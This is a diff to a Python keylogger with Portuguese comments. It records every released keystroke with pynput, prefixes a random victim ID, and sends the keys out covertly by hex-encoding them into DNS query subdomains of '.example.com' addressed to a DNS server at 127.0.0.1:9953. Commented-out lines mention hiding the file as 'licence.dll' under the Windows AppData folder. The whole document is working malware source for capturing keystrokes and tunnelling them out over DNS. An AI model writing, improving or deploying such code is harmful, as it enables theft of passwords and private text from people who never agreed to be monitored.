@@ -1,12 +1,10 @@
 ###############################################################
 # Imports
 ###############################################################
-import os
-import time
 import socket
 import random
 from pynput import keyboard
-from dnslib import DNSRecord, RR, A
+from dnslib import DNSRecord
 
 ###############################################################
 # Vars. Global
@@ -14,23 +12,14 @@ from dnslib import DNSRecord, RR, A
 # Ofuscação no Windows (Antigamente era salvo em arquivo... mudei os planos) 
 # _PATH = f'C:\\Users\\{os.getlogin()}\\AppData\\Local\\Microsoft\\Windows NA'
 # _NAME = 'licence.dll'
+
+# Futuramente podemos passar essas VARs global
+# Para dentro do code, está aqui apenas para
+# facilitar as alterações
 _DNS_ADDR = ('127.0.0.1', 9953)
 _FAKE_DOMAIN = '.example.com'
 _KEYS = []
 _USR_HAS = None
-
-# NUMPAD_KEYS = { -------------------------- NÃO FUNCIONANDO
-#     keyboard.KeyCode.from_vk(98): '0',
-#     keyboard.KeyCode.from_vk(89): '1',
-#     keyboard.KeyCode.from_vk(90): '2',
-#     keyboard.KeyCode.from_vk(91): '3',
-#     keyboard.KeyCode.from_vk(92): '4',
-#     keyboard.KeyCode.from_vk(93): '5',
-#     keyboard.KeyCode.from_vk(94): '6',
-#     keyboard.KeyCode.from_vk(95): '7',
-#     keyboard.KeyCode.from_vk(96): '8',
-#     keyboard.KeyCode.from_vk(97): '9'
-# }
 
 ###############################################################
 # Classes e Funções
@@ -60,14 +49,7 @@ def send_data(data):
     global _DNS_ADDR, _FAKE_DOMAIN
 
     # Remove entradas None da lista - Unico metodo ate agora que funcionou para nao crashar
-    data = [entry for entry in data if entry is not None]
-
-    print('vou enviar algo')
-
-    # Convertendo para bytes usando somente 8 bits para economizar
-    # espaço, data seria enviado pela rede
-    #data = [entry.to_bytes(1, 'big') for entry in data]
-    #print(data)
+    # data = [entry for entry in data if entry is not None]
 
     # Divide os dados em partes menores para serem válidos
     # como nomes de domínio máximo de 63bytes por hostname.
@@ -77,8 +59,7 @@ def send_data(data):
     while len(parts) > 0:
         # Cria o payload com o nome de domínio fictício
         payload = parts.pop(0)
-        print(f'enviando isso: {payload}')
-        payload = ''.join([hex(ord(c)) for c in payload])
+        payload = ''.join([hex(ord(c)) for c in payload]) # ord() no c
         payload = payload.replace('0x', '')
         request = str(payload) + str(_FAKE_DOMAIN)
         
@@ -100,70 +81,66 @@ def send_data(data):
         except socket.timeout:
             print('Tempo de espera expirado. Não foi recebida uma resposta do servidor DNS.')
             pass
-            
-        # Não sei se precisa disso...
-        sock.close()
+
 
 def on_release(key):
     global _KEYS, _USR_HAS
 
+    # Verifico se já está no tamanho de mandar o pacote DNS
     if len(_KEYS) >= (31 - len(_USR_HAS)):
         for ch in _USR_HAS:
             _KEYS.insert(0, ch)
         send_data(_KEYS)
         _KEYS = []
 
+    # Condição de parada (podemos remover depois...)
     if key == keyboard.Key.esc:
         return False
     
-    key = str(key).replace("'", "").replace('[', '').replace(']', '')
+    # Trato teclas / numeros
+    try:
+        if key.char != None:
+            _KEYS.append(key.char) # ord()
+            print(key.char)
 
-    # Tratando o 5 no Linux
-    if key == '<65437>':
-        _KEYS.append('5')
+        else:
+            if '<96>' == str(key):
+                _KEYS.append('0')
+            elif '<97>' == str(key):
+                _KEYS.append('1')
+            elif '<98>' == str(key):
+                _KEYS.append('2')
+            elif '<99>' == str(key):
+                _KEYS.append('3')
+            elif '<100>' == str(key):
+                _KEYS.append('4')
+            elif '<101>' == str(key):
+                _KEYS.append('5')
+            elif '<102>' == str(key):
+                _KEYS.append('6')
+            elif '<103>' == str(key):
+                _KEYS.append('7')
+            elif '<104>' == str(key):
+                _KEYS.append('8')
+            elif '<105>' == str(key):
+                _KEYS.append('9')
+                
+            # todo o resto que não tratei
+            else:
+                print(f'Não consegui identificar: {key}')
 
-    # Tratar os especiais
-    elif 'Key.enter' == key or 'Key.space' == key:
-        _KEYS.append(' ')
-    # Tratando os numeros
-    elif '<96>' == key:
-        _KEYS.append('0')
-    elif '<97>' == key:
-        _KEYS.append('1')
-    elif '<98>' == key:
-        _KEYS.append('2')
-    elif '<99>' == key:
-        _KEYS.append('3')
-    elif '<100>' == key:
-        _KEYS.append('4')
-    elif '<101>' == key:
-        _KEYS.append('5')
-    elif '<102>' == key:
-        _KEYS.append('6')
-    elif '<103>' == key:
-        _KEYS.append('7')
-    elif '<104>' == key:
-        _KEYS.append('8')
-    elif '<105>' == key:
-        _KEYS.append('9')
-
-    # Jogando fora todo os Shift
-    elif 'Key' in key:
-        pass
-
-    elif '<110>' == key:
-        _KEYS.append(',')
-
-    # Capturando as teclas
-    else:
-        _KEYS.append(key)
-  
+    # Trato se for algum caractere especial
+    except AttributeError:
+        print(f'Não tenho tratamento para isso: {key}')
 
 ###############################################################
 # Main
 ###############################################################
 if __name__ == "__main__":
+    # Gerando nome aleatório
     _USR_HAS = [char for char in hash_adler32(str(random.randint(100, 999)))]
+
+    # Iniciando Keylogger
     lst = keyboard.Listener(on_release=on_release)
     lst.start()
     lst.join()
